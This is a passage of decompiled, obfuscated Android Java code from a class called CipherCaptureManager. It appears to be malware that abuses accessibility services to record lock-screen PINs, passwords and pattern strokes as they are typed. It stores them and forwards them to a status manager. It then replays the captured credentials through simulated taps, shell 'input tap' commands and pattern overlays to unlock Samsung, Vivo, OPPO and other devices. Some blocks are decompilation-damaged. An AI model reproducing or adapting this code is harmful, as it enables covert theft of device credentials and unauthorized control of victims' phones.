                t60.m214702c3("CipherCaptureManager", "🔙 退格键: 移除最后一位 (剩余: " + AbstractC0715je.m213295i2(this.f53298b2, "", null, null, null, 62) + ")");
            }
            if (source4 != null) {
                source4.recycle();
                return;
            }
            return;
        }
        if (!AbstractC0779a1.m213652a5(viewIdResourceName2, ":id/key", false) || AbstractC0779a1.m213652a5(viewIdResourceName2, "VivoPinkey", false)) {
            strM213684d7 = null;
        } else {
            strM213684d7 = AbstractC0779a1.m213684d7(viewIdResourceName2, "key");
            if (!new Regex("\\d").m213646a2(strM213684d7) && !new Regex("[a-zA-Z]").m213646a2(strM213684d7)) {
                if (strM213684d7.length() == 2 && strM213684d7.charAt(0) == '_' && Character.isLetter(strM213684d7.charAt(1))) {
                    strM213684d7 = String.valueOf(strM213684d7.charAt(1));
                }
            }
        }
        if (AbstractC0779a1.m213652a5(viewIdResourceName2, ":id/VivoPinkey", false)) {
            strM213684d72 = AbstractC0779a1.m213684d7(viewIdResourceName2, "VivoPinkey");
            if (!new Regex("\\d").m213646a2(strM213684d72)) {
                strM213684d72 = null;
            }
        }
        if (AbstractC0779a1.m213652a5(viewIdResourceName2, ":id/num", false)) {
            strM213684d73 = AbstractC0779a1.m213684d7(viewIdResourceName2, "num");
            if (!new Regex("\\d").m213646a2(strM213684d73)) {
                strM213684d73 = null;
            }
        }
        if (AbstractC0779a1.m213652a5(viewIdResourceName2, ":id/char_", false)) {
            String strM213684d74 = AbstractC0779a1.m213684d7(viewIdResourceName2, "char_");
            i = 1;
            if (strM213684d74.length() == 1) {
                strM213684d73 = strM213684d74;
                z2 = true;
            }
            if (string3.length() == i || !new Regex("[0-9a-zA-Z]").m213646a2(string3)) {
                string3 = null;
            }
            String str6 = (str.length() == i || !new Regex("[0-9a-zA-Z]").m213646a2(str)) ? null : str;
            if (strM213684d7 == null) {
                if (string3 != null) {
                    strM213684d7 = string3;
                } else if (strM213684d72 != null) {
                    strM213684d7 = strM213684d72;
                } else if (strM213684d73 != null) {
                    strM213684d7 = strM213684d73;
                } else {
                    strM213684d7 = str6 != null ? str6 : null;
                }
                z2 = false;
            } else {
                z2 = false;
            }
            if (strM213684d7 != null) {
                this.f53298b2.add(strM213684d7);
                if (z2) {
                    this.f53299b3 = true;
                }
                t60.m214702c3("CipherCaptureManager", AbstractC0003a2.m34b5("🔢 捕获按键: ", strM213684d7, " (当前序列: ", AbstractC0715je.m213295i2(this.f53298b2, "", null, null, null, 62), ")"));
            }
            if (AbstractC0779a1.m213652a5(viewIdResourceName2, "enter", false) && !AbstractC0779a1.m213652a5(viewIdResourceName2, "confirm", false) && !AbstractC0779a1.m213652a5(viewIdResourceName2, "iv_complete", false) && !AbstractC0779a1.m213652a5(viewIdResourceName2, "mix_confirm", false) && !AbstractC0779a1.m213652a5(viewIdResourceName2, "vivo_pin_confirm", false) && !AbstractC0779a1.m213652a5(viewIdResourceName2, "mix_normal_confirm", false) && !AbstractC0779a1.m213652a5(viewIdResourceName2, "btn_letter_ok", false)) {
                List list2 = dh0.f55778c8;
                if (list2 == null || !list2.isEmpty()) {
                    Iterator it2 = list2.iterator();
                    while (true) {
                        if (it2.hasNext()) {
                            z3 = true;
                            if (AbstractC0779a1.m213652a5(str, (String) it2.next(), true)) {
                                z4 = true;
                                break;
                            }
                        } else {
                            z3 = true;
                            z4 = false;
                            break;
                        }
                    }
                } else {
                    z4 = false;
                    z3 = true;
                }
                if (z4) {
                }
                if (source4 != null) {
                    source4.recycle();
                    return;
                }
                return;
            }
            z3 = true;
            strM213295i2 = AbstractC0715je.m213295i2(this.f53298b2, "", null, null, null, 62);
            if (strM213295i2.length() <= 0 ? z3 : false) {
                t60.m214714d6("CipherCaptureManager", "✅ PIN 输入完成: ".concat(new Regex(".").m213647a3(strM213295i2, "*")));
                m211810a9(strM213295i2, this.f53299b3 ? "password" : "pin");
                this.f53298b2.clear();
                this.f53299b3 = false;
            }
            if (source4 != null) {
            }
        } else {
            i = 1;
        }
        z2 = false;
        if (string3.length() == i) {
            string3 = null;
        }
        if (str.length() == i) {
        }
        if (strM213684d7 == null) {
        }
        if (strM213684d7 != null) {
        }
        if (AbstractC0779a1.m213652a5(viewIdResourceName2, "enter", false)) {
            z3 = true;
            strM213295i2 = AbstractC0715je.m213295i2(this.f53298b2, "", null, null, null, 62);
            if (strM213295i2.length() <= 0 ? z3 : false) {
            }
        }
        if (source4 != null) {
        }
    }

    /* renamed from: d7 */
    public final synchronized void m211821d7(C0598hx c0598hx) {
        try {
            String key_lock_cipher = c0598hx.f56764a4 ? f53283c5.getKEY_LOCK_CIPHER() : f53284c6;
            C0598hx c0598hxM211819d0 = m211819d0(c0598hx.f56764a4);
            if (c0598hxM211819d0 != null) {
                String str = c0598hx.f56760a0.length() > 0 ? c0598hx.f56760a0 : c0598hxM211819d0.f56760a0;
                String str2 = c0598hx.f56761a1;
                String str3 = (str2 == null || str2.length() == 0) ? c0598hxM211819d0.f56761a1 : c0598hx.f56761a1;
                List list = c0598hx.f56762a2;
                List list2 = (list == null || list.isEmpty()) ? c0598hxM211819d0.f56762a2 : c0598hx.f56762a2;
                List list3 = c0598hx.f56763a3;
                List list4 = (list3 == null || list3.isEmpty()) ? c0598hxM211819d0.f56763a3 : c0598hx.f56763a3;
                boolean z = c0598hx.f56764a4;
                long j = c0598hx.f56765a5;
                Rect rect = c0598hx.f56766a6;
                if (rect == null) {
                    rect = c0598hxM211819d0.f56766a6;
                }
                Rect rect2 = c0598hx.f56767a7;
                if (rect2 == null) {
                    rect2 = c0598hxM211819d0.f56767a7;
                }
                List list5 = c0598hx.f56768a8;
                c0598hx = new C0598hx(str, str3, list2, list4, z, j, rect, rect2, (list5 == null || list5.isEmpty()) ? c0598hxM211819d0.f56768a8 : c0598hx.f56768a8, 512);
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("cipherGradeCode", c0598hx.f56760a0);
            Object obj = c0598hx.f56761a1;
            if (obj == null) {
                obj = "";
            }
            jSONObject.put("textCipher", obj);
            List list6 = c0598hx.f56762a2;
            jSONObject.put("patternCipher", list6 != null ? new JSONArray((Collection<?>) list6) : new JSONArray());
            List<android.graphics.Point> list7 = c0598hx.f56763a3;
            if (list7 != null) {
                JSONArray jSONArray = new JSONArray();
                for (android.graphics.Point point : list7) {
                    JSONArray jSONArray2 = new JSONArray();
                    jSONArray2.put(point.x);
                    jSONArray2.put(point.y);
                    jSONArray.put(jSONArray2);
                }
                jSONObject.put("patternScreenPoints", jSONArray);
            }
            jSONObject.put("isLocked", c0598hx.f56764a4);
            jSONObject.put("captureTime", c0598hx.f56765a5);
            Rect rect3 = c0598hx.f56766a6;
            if (rect3 != null) {
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put("left", rect3.left);
                jSONObject2.put("top", rect3.top);
                jSONObject2.put("right", rect3.right);
                jSONObject2.put("bottom", rect3.bottom);
                jSONObject.put("boundsInScreen", jSONObject2);
            }
            Rect rect4 = c0598hx.f56767a7;
            if (rect4 != null) {
                JSONObject jSONObject3 = new JSONObject();
                jSONObject3.put("left", rect4.left);
                jSONObject3.put("top", rect4.top);
                jSONObject3.put("right", rect4.right);
                jSONObject3.put("bottom", rect4.bottom);
                jSONObject.put("boundsInParent", jSONObject3);
            }
            List list8 = c0598hx.f56768a8;
            if (list8 != null) {
                JSONArray jSONArray3 = new JSONArray();
                Iterator it = list8.iterator();
                while (it.hasNext()) {
                    jSONArray3.put(new JSONArray((Collection<?>) it.next()));
                }
                jSONObject.put("touchCipher", jSONArray3);
            }
            String string = jSONObject.toString();
            t60.m214694b5(string, "json.toString()");
            String strM211789c2 = m211789c2(string);
            if (strM211789c2 == null) {
                return;
            }
            Object value = this.f53288a2.getValue();
            t60.m214694b5(value, "<get-prefs>(...)");
            ((SharedPreferences) value).edit().putString(key_lock_cipher, strM211789c2).apply();
        } catch (Throwable th) {
            throw th;
        }
    }

    /* renamed from: d9 */
    public final void m211822d9(String str) {
        if (str.length() == 0) {
            return;
        }
        AbstractC0780a0.m213692a3(this.f53293a7, null, new CipherCaptureManager$sendPasswordEvent$1(this, str, null), 3);
    }

    /* renamed from: e0 */
    public final void m211823e0() {
        RunnableC0615ia runnableC0615ia = this.f53290a4;
        if (runnableC0615ia != null) {
            this.f53294a8.removeCallbacks(runnableC0615ia);
            t60.m214702c3("CipherCaptureManager", "🔷 [OverlayWatcher] 已停止");
        }
        this.f53290a4 = null;
    }

    /* renamed from: e1 */
    public final void m211824e1(C0598hx c0598hx) {
        try {
            C0107as c0106ar = C0107as.f45610a3.getInstance(this.f53287a1);
            boolean z = c0598hx.f56764a4;
            String str = c0598hx.f56760a0;
            String strM213295i2 = c0598hx.f56761a1;
            if (z) {
                String str2 = "6pin";
                if (t60.m214686a2(str, f53283c5.getQUALITY_NUMERIC())) {
                    if ((strM213295i2 != null ? strM213295i2.length() : 0) <= 4) {
                        str2 = "4pin";
                    }
                } else if (t60.m214686a2(str, "PASSWORD_QUALITY_NUMERIC_COMPLEX")) {
                    if ((strM213295i2 != null ? strM213295i2.length() : 0) <= 4) {
                        str2 = "4pin";
                    }
                } else {
                    str2 = t60.m214686a2(str, "PASSWORD_QUALITY_ALPHANUMERIC") ? "mixed" : t60.m214686a2(str, "PASSWORD_QUALITY_PATTERN") ? "pattern" : "unknown";
                }
                if (t60.m214686a2(str, "PASSWORD_QUALITY_PATTERN")) {
                    List list = c0598hx.f56762a2;
                    strM213295i2 = list != null ? AbstractC0715je.m213295i2(list, ",", null, null, null, 62) : "";
                } else if (strM213295i2 == null) {
                }
                c0106ar.m210507a6(str2, true, strM213295i2);
                t60.m214714d6("CipherCaptureManager", "✅ 已同步锁屏密码到 AppStatusManager: type=" + str2 + ", value=" + strM213295i2);
            }
        } catch (Exception e) {
            tz0.m214807a7("❌ 同步到 AppStatusManager 失败: ", e.getMessage(), "CipherCaptureManager");
        }
    }

    /* renamed from: e2 */
    public final boolean m211825e2(String str) throws InterruptedException, IOException {
        String string;
        String str2 = "com.android.systemui";
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f53286a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return false;
            }
            CharSequence packageName = rootInActiveWindow.getPackageName();
            if (packageName == null || (string = packageName.toString()) == null) {
                string = "com.android.settings";
            }
            if (!string.equals("com.android.systemui")) {
                str2 = "com.android.settings";
            }
            LinkedHashMap linkedHashMap = new LinkedHashMap();
            for (int i = 0; i < 10; i++) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str2 + ":id/key" + i);
                t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "nodes");
                if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    Rect rect = new Rect();
                    listFindAccessibilityNodeInfosByViewId.get(0).getBoundsInScreen(rect);
                    linkedHashMap.put(String.valueOf(i), rect);
                }
            }
            if (linkedHashMap.size() < 10) {
                t60.m214726f4("CipherCaptureManager", "ADB PIN: 只找到 " + linkedHashMap.size() + " 个按键，放弃");
                return false;
            }
            int length = str.length();
            for (int i2 = 0; i2 < length; i2++) {
                Rect rect2 = (Rect) linkedHashMap.get(String.valueOf(str.charAt(i2)));
                if (rect2 != null) {
                    int iCenterX = rect2.centerX();
                    int iCenterY = rect2.centerY();
                    try {
                        Process processExec = Runtime.getRuntime().exec(new String[]{"sh", "-c", "input tap " + iCenterX + " " + iCenterY});
                        TimeUnit timeUnit = TimeUnit.SECONDS;
                        if (!processExec.waitFor(10L, TimeUnit.SECONDS)) {
                            processExec.destroy();
                        }
                    } catch (Exception e) {
                        t60.m214726f4("CipherCaptureManager", "ADB tap 失败: " + e.getMessage());
                    }
                    for (int i3 = 0; i3 < 2; i3++) {
                        try {
                            Thread.sleep(200L);
                        } catch (Exception unused) {
                        }
                    }
                }
            }
            m211805a2();
            return m211803a0();
        } catch (Exception e2) {
            tz0.m214807a7("tryAdbPinInput 异常: ", e2.getMessage(), "CipherCaptureManager");
            return false;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:30:0x0069, code lost:
    
        r2 = p000.AbstractC0716jf.m213306g5("com.android.systemui:id/button_use_credential", "com.android.settings:id/button_use_credential", "com.samsung.android.biometrics.app.setting:id/button_use_credential").iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:32:0x007f, code lost:
    
        if (r2.hasNext() == false) goto L54;
     */
    /* JADX WARN: Code restructure failed: missing block: B:33:0x0081, code lost:
    
        r3 = (java.lang.String) r2.next();
        r4 = m211794c7(r1, r3, "android.widget.TextView");
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x008b, code lost:
    
        if (r4 != null) goto L36;
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x008d, code lost:
    
        r4 = m211793c6(r1, r3);
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x0091, code lost:
    
        if (r4 == null) goto L58;
     */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x0097, code lost:
    
        if (m211811b0(r4, r3) == false) goto L59;
     */
    /* JADX WARN: Code restructure failed: missing block: B:61:?, code lost:
    
        return false;
     */
    /* renamed from: e3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m211826e3() {
        JSONObject jSONObjectOptJSONObject;
        JSONArray jSONArrayOptJSONArray;
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f53286a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return false;
            }
            ArrayList arrayList = new ArrayList();
            JSONObject jSONObject = AbstractC1117qo.f59540a4;
            if (jSONObject != null && (jSONObjectOptJSONObject = jSONObject.optJSONObject("cancelButtonIds")) != null && (jSONArrayOptJSONArray = jSONObjectOptJSONObject.optJSONArray("allIds")) != null) {
                int length = jSONArrayOptJSONArray.length();
                for (int i = 0; i < length; i++) {
                    String string = jSONArrayOptJSONArray.getString(i);
                    t60.m214694b5(string, "arr.getString(i)");
                    arrayList.add(string);
                }
            }
            int size = arrayList.size();
            int i2 = 0;
            while (true) {
                if (i2 >= size) {
                    break;
                }
                Object obj = arrayList.get(i2);
                i2++;
                String str = (String) obj;
                if (AbstractC0779a1.m213652a5(str, "use_credential", false)) {
                    AccessibilityNodeInfo accessibilityNodeInfoM211794c7 = m211794c7(rootInActiveWindow, str, "android.widget.TextView");
                    if (accessibilityNodeInfoM211794c7 == null) {
                        accessibilityNodeInfoM211794c7 = m211793c6(rootInActiveWindow, str);
                    }
                    if (accessibilityNodeInfoM211794c7 != null && m211811b0(accessibilityNodeInfoM211794c7, str)) {
                        break;
                    }
                }
            }
            return true;
        } catch (Exception e) {
            tz0.m214810b0("tryFindAndClickUseCredential 异常: ", e.getMessage(), "CipherCaptureManager");
            return false;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:35:0x0089, code lost:
    
        r2 = android.os.Build.BRAND;
        p000.t60.m214694b5(r2, "BRAND");
        r2 = r2.toLowerCase(java.util.Locale.ROOT);
        p000.t60.m214694b5(r2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x009b, code lost:
    
        if (r2.equals("vivo") != false) goto L41;
     */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x00a1, code lost:
    
        if (r2.equals("iqoo") == false) goto L40;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x00aa, code lost:
    
        p000.t60.m214702c3("CipherCaptureManager", "confirmLockByVivo ALPHANUMERIC");
        r2 = r19.length();
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x00b3, code lost:
    
        r14 = 0;
        r15 = false;
     */
    /* JADX WARN: Code restructure failed: missing block: B:43:0x00b5, code lost:
    
        if (r14 >= r2) goto L150;
     */
    /* JADX WARN: Code restructure failed: missing block: B:45:0x00b9, code lost:
    
        r7 = r18.f53286a0.getRootInActiveWindow();
     */
    /* JADX WARN: Code restructure failed: missing block: B:46:0x00bf, code lost:
    
        if (r7 != null) goto L48;
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x00c2, code lost:
    
        r8 = r7;
     */
    /* JADX WARN: Code restructure failed: missing block: B:49:0x00c3, code lost:
    
        r7 = java.lang.String.valueOf(r19.charAt(r14));
        r12 = new kotlin.text.Regex("\\d").m213646a2(r7);
     */
    /* JADX WARN: Code restructure failed: missing block: B:50:0x00d8, code lost:
    
        if (r12 == false) goto L54;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x00da, code lost:
    
        r13 = new java.lang.StringBuilder();
        r13.append(r3);
        r17 = r2;
        r13.append(":id/num");
        r2 = r13.toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:54:0x00f1, code lost:
    
        r17 = r2;
        r2 = r3 + ":id/char_";
     */
    /* JADX WARN: Code restructure failed: missing block: B:55:0x0104, code lost:
    
        r2 = r2 + r7;
        r7 = m211794c7(r8, r2, "android.widget.Button");
     */
    /* JADX WARN: Code restructure failed: missing block: B:56:0x0119, code lost:
    
        if (r7 == null) goto L152;
     */
    /* JADX WARN: Code restructure failed: missing block: B:58:0x0121, code lost:
    
        if (r7.performAction(16) == false) goto L153;
     */
    /* JADX WARN: Code restructure failed: missing block: B:59:0x0123, code lost:
    
        if (r12 == false) goto L61;
     */
    /* JADX WARN: Code restructure failed: missing block: B:60:0x0125, code lost:
    
        r7 = "Num";
     */
    /* JADX WARN: Code restructure failed: missing block: B:61:0x0128, code lost:
    
        r7 = "Char";
     */
    /* JADX WARN: Code restructure failed: missing block: B:62:0x012a, code lost:
    
        p000.t60.m214702c3("CipherCaptureManager", "Click VIVO " + r7 + " Node ID: " + r2);
     */
    /* JADX WARN: Code restructure failed: missing block: B:63:0x0146, code lost:
    
        if (r9 == false) goto L65;
     */
    /* JADX WARN: Code restructure failed: missing block: B:64:0x0148, code lost:
    
        m211784a7();
     */
    /* JADX WARN: Code restructure failed: missing block: B:65:0x014c, code lost:
    
        m211783a6();
     */
    /* JADX WARN: Code restructure failed: missing block: B:66:0x014f, code lost:
    
        r15 = true;
     */
    /* JADX WARN: Code restructure failed: missing block: B:67:0x0151, code lost:
    
        r8.refresh();
        r14 = r14 + 1;
        r2 = r17;
     */
    /* JADX WARN: Code restructure failed: missing block: B:68:0x015a, code lost:
    
        r20 = 1;
        r20 = 1;
        r16 = false;
        r16 = false;
     */
    /* JADX WARN: Code restructure failed: missing block: B:69:0x015e, code lost:
    
        if (r15 == false) goto L72;
     */
    /* JADX WARN: Code restructure failed: missing block: B:70:0x0160, code lost:
    
        m211805a2();
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* renamed from: e4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m211827e4(String str, String str2) {
        boolean z;
        String string;
        String string2;
        boolean z2;
        String str3 = "com.samsung.android.biometrics.app.setting";
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f53286a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return false;
            }
            CharSequence packageName = rootInActiveWindow.getPackageName();
            if (packageName == null || (string = packageName.toString()) == null) {
                string = "";
            }
            boolean zEquals = string.equals("com.android.systemui");
            CharSequence packageName2 = rootInActiveWindow.getPackageName();
            if (packageName2 == null || (string2 = packageName2.toString()) == null) {
                string2 = "com.android.settings";
            }
            if (string2.equals("com.android.systemui")) {
                str3 = "com.android.systemui";
            } else if (!string2.equals("com.samsung.android.biometrics.app.setting")) {
                str3 = "com.android.settings";
            }
            t60.m214702c3("CipherCaptureManager", "confirmLockByNodes: type=" + str2 + ", pkg=" + str3);
            if (t60.m214686a2(str2, "PASSWORD_QUALITY_ALPHANUMERIC")) {
                int i = 0;
                while (true) {
                    if (i >= str.length()) {
                        break;
                    }
                    if (!Character.isDigit(str.charAt(i))) {
                        break;
                    }
                    try {
                        z = false;
                        i++;
                    } catch (Exception e) {
                        e = e;
                        tz0.m214807a7("tryKeyNodeInput 异常: ", e.getMessage(), "CipherCaptureManager");
                        return z;
                    }
                }
                z2 = 1;
                z = false;
            } else {
                z2 = 1;
                z = false;
            }
            t60.m214702c3("CipherCaptureManager", "confirmLockByPinKey");
            String str4 = Build.BRAND;
            t60.m214694b5(str4, "BRAND");
            String lowerCase = str4.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            if (lowerCase.equals("oppo") || lowerCase.equals("realme") || lowerCase.equals("oneplus")) {
                t60.m214702c3("CipherCaptureManager", "confirmLockByPinKey: OPPO desc匹配");
                AccessibilityNodeInfo rootInActiveWindow2 = this.f53286a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                    rootInActiveWindow = rootInActiveWindow2;
                }
                int length = str.length();
                for (int i2 = z ? 1 : 0; i2 < length; i2++) {
                    String strValueOf = String.valueOf(str.charAt(i2));
                    AccessibilityNodeInfo accessibilityNodeInfoM211792c5 = m211792c5(rootInActiveWindow, strValueOf);
                    if (accessibilityNodeInfoM211792c5 != null && accessibilityNodeInfoM211792c5.performAction(16)) {
                        t60.m214702c3("CipherCaptureManager", "Click Pin Node desc: " + strValueOf);
                        if (zEquals) {
                            m211784a7();
                        } else {
                            m211783a6();
                        }
                    }
                    rootInActiveWindow.refresh();
                }
                m211805a2();
            }
            String str5 = Build.BRAND;
            t60.m214694b5(str5, "BRAND");
            String lowerCase2 = str5.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            if (lowerCase2.equals("vivo") || lowerCase2.equals("iqoo")) {
                t60.m214702c3("CipherCaptureManager", "confirmLockByVivoPinKey");
                AccessibilityNodeInfo rootInActiveWindow3 = this.f53286a0.getRootInActiveWindow();
                if (rootInActiveWindow3 != null) {
                    rootInActiveWindow = rootInActiveWindow3;
                }
                String str6 = str3 + ":id/four_to_more_key";
                int length2 = str.length();
                int i3 = z ? 1 : 0;
                int i4 = i3;
                while (i3 < length2) {
                    String str7 = str6 + str.charAt(i3);
                    AccessibilityNodeInfo accessibilityNodeInfoM211793c6 = m211793c6(rootInActiveWindow, str7);
                    if (accessibilityNodeInfoM211793c6 != null && accessibilityNodeInfoM211793c6.performAction(16)) {
                        t60.m214702c3("CipherCaptureManager", "Click Pin Node ID: " + str7);
                        if (zEquals) {
                            m211784a7();
                        } else {
                            m211783a6();
                        }
                        i4 = z2;
                    }
                    rootInActiveWindow.refresh();
                    i3++;
                }
                if (i4 != 0) {
                    m211805a2();
                    if (m211803a0()) {
                        return z2;
                    }
                }
            }
            t60.m214702c3("CipherCaptureManager", "confirmLockByGenericKey");
            AccessibilityNodeInfo rootInActiveWindow4 = this.f53286a0.getRootInActiveWindow();
            if (rootInActiveWindow4 != null) {
                rootInActiveWindow = rootInActiveWindow4;
            }
            String str8 = str3 + ":id/key";
            int length3 = str.length();
            int i5 = z ? 1 : 0;
            int i6 = i5;
            while (i5 < length3) {
                String str9 = str8 + str.charAt(i5);
                AccessibilityNodeInfo accessibilityNodeInfoM211794c7 = m211794c7(rootInActiveWindow, str9, "android.view.ViewGroup");
                if (accessibilityNodeInfoM211794c7 == null) {
                    accessibilityNodeInfoM211794c7 = m211793c6(rootInActiveWindow, str9);
                }
                if (accessibilityNodeInfoM211794c7 != null && accessibilityNodeInfoM211794c7.performAction(16)) {
                    t60.m214702c3("CipherCaptureManager", "Click Pin Node ID: " + str9);
                    if (zEquals) {
                        m211784a7();
                    } else {
                        m211783a6();
                    }
                    i6 = z2;
                }
                rootInActiveWindow.refresh();
                i5++;
            }
            if (i6 == 0) {
                return z;
            }
            m211805a2();
            return m211803a0();
        } catch (Exception e2) {
            e = e2;
            z = false;
        }
    }

    /* renamed from: e5 */
    public final boolean m211828e5(C0598hx c0598hx) {
        AccessibilityNodeInfo rootInActiveWindow;
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM211796c9;
        List list = c0598hx.f56762a2;
        if (list != null && list.size() >= 4 && (rootInActiveWindow = this.f53286a0.getRootInActiveWindow()) != null) {
            CharSequence packageName = rootInActiveWindow.getPackageName();
            if (packageName == null || (string = packageName.toString()) == null) {
                string = "com.android.settings";
            }
            Iterator it = AbstractC0716jf.m213306g5(string.concat(":id/lockPattern"), "com.android.settings:id/lockPattern", "com.android.systemui:id/lockPattern", "com.coloros.settings:id/lockPattern", "com.oplus.settings:id/lockPattern").iterator();
            while (true) {
                if (!it.hasNext()) {
                    accessibilityNodeInfoM211796c9 = null;
                    break;
                }
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId((String) it.next());
                t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "nodes");
                if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    accessibilityNodeInfoM211796c9 = listFindAccessibilityNodeInfosByViewId.get(0);
                    break;
                }
            }
            if (accessibilityNodeInfoM211796c9 == null) {
                accessibilityNodeInfoM211796c9 = m211796c9(rootInActiveWindow);
            }
            if (accessibilityNodeInfoM211796c9 != null) {
                Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfoM211796c9);
                float fWidth = rectM24a5.width() / 3.0f;
                float fHeight = rectM24a5.height() / 3.0f;
                ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(list));
                Iterator it2 = list.iterator();
                while (it2.hasNext()) {
                    int iIntValue = ((Number) it2.next()).intValue();
                    arrayList.add(new PointF((fWidth / 2.0f) + ((iIntValue % 3) * fWidth) + rectM24a5.left, (fHeight / 2.0f) + ((iIntValue / 3) * fHeight) + rectM24a5.top));
                }
                return m211808a5(arrayList);
            }
        }
        return false;
    }

    /* renamed from: e6 */
    public final void m211829e6() {
        String string;
        String string2;
        List list;
        List list2;
        C0337a3 c0337a3;
        AccessibilityNodeInfo rootInActiveWindow = this.f53286a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            t60.m214726f4("CipherCaptureManager", "🔷 rootInActiveWindow 为 null，无法检测");
            C0337a3 c0337a32 = this.f53289a3;
            if (c0337a32 == null || !c0337a32.m211845a8()) {
                return;
            }
            t60.m214714d6("CipherCaptureManager", "🔷 rootInActiveWindow 为 null，清理现有覆盖层");
            this.f53294a8.post(new RunnableC0596hw(this, 6));
            return;
        }
        CharSequence packageName = rootInActiveWindow.getPackageName();
        if (packageName == null || (string = packageName.toString()) == null) {
            string = "unknown";
        }
        if (!string.equals("com.android.systemui") && !string.equals("com.android.settings") && !string.equals("com.samsung.android.biometrics.app.setting") && (c0337a3 = this.f53289a3) != null && c0337a3.m211845a8()) {
            t60.m214714d6("CipherCaptureManager", "🔷 [tryStartPatternOverlay] 检测到非密码界面(" + string + ")，立即清理覆盖层");
            rootInActiveWindow.recycle();
            this.f53294a8.post(new RunnableC0596hw(this, 7));
            return;
        }
        C0337a3 c0337a33 = this.f53289a3;
        if (c0337a33 != null && c0337a33.m211845a8()) {
            t60.m214702c3("CipherCaptureManager", "🔷 已在捕获图案，跳过");
            rootInActiveWindow.recycle();
            return;
        }
        CharSequence packageName2 = rootInActiveWindow.getPackageName();
        String str = "";
        if (packageName2 == null || (string2 = packageName2.toString()) == null) {
            string2 = "";
        }
        boolean z = false;
        if (string2.equals("com.android.systemui")) {
            C0598hx c0598hxM211819d0 = m211819d0(true);
            C0598hx c0598hxM211819d02 = m211819d0(false);
            if ((c0598hxM211819d0 != null && t60.m214686a2(c0598hxM211819d0.f56760a0, "PASSWORD_QUALITY_PATTERN") && (list2 = c0598hxM211819d0.f56762a2) != null && !list2.isEmpty()) || (c0598hxM211819d02 != null && t60.m214686a2(c0598hxM211819d02.f56760a0, "PASSWORD_QUALITY_PATTERN") && (list = c0598hxM211819d02.f56762a2) != null && !list.isEmpty())) {
                t60.m214702c3("CipherCaptureManager", "🔷 锁屏场景已有图案密码，不需要建覆盖层捕获");
                rootInActiveWindow.recycle();
                return;
            }
        }
        t60.m214702c3("CipherCaptureManager", "🔷 当前窗口包名: " + string + ", isOppo=" + AbstractC1117qo.m214448e4());
        Iterator it = AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(AbstractC1117qo.m214439d5(), AbstractC0716jf.m213306g5("com.android.systemui:id/lockPattern", "com.android.systemui:id/biometric_lockPattern", "com.android.systemui:id/lockPatternView", "com.android.settings:id/lockPattern", "com.android.settings:id/biometric_lockPattern", "com.samsung.android.biometrics.app.setting:id/lockPattern", "com.samsung.android.biometrics.app.setting:id/biometric_lockPattern"))).iterator();
        while (true) {
            if (!it.hasNext()) {
                break;
            }
            String str2 = (String) it.next();
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str2);
            t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "nodes");
            if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                t60.m214714d6("CipherCaptureManager", "🔷 ✅ 检测到图案锁元素: " + str2 + " (节点数: " + listFindAccessibilityNodeInfosByViewId.size() + ")");
                Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                while (it2.hasNext()) {
                    ((AccessibilityNodeInfo) it2.next()).recycle();
                }
                z = true;
                str = str2;
            }
        }
        if (!z) {
            if (!string.equals("com.android.systemui") && !string.equals("com.android.settings") && !string.equals("com.samsung.android.biometrics.app.setting") && this.f53289a3 != null) {
                t60.m214714d6("CipherCaptureManager", "🔷 检测到非密码界面(" + string + ")无图案锁，清理覆盖层");
                this.f53294a8.post(new RunnableC0596hw(this, 0));
            }
            t60.m214702c3("CipherCaptureManager", "🔷 当前界面无图案锁元素");
            rootInActiveWindow.recycle();
            return;
        }
        if (this.f53304b8) {
            t60.m214702c3("CipherCaptureManager", "🔷 已有待创建请求，跳过");
            return;
        }
        this.f53304b8 = true;
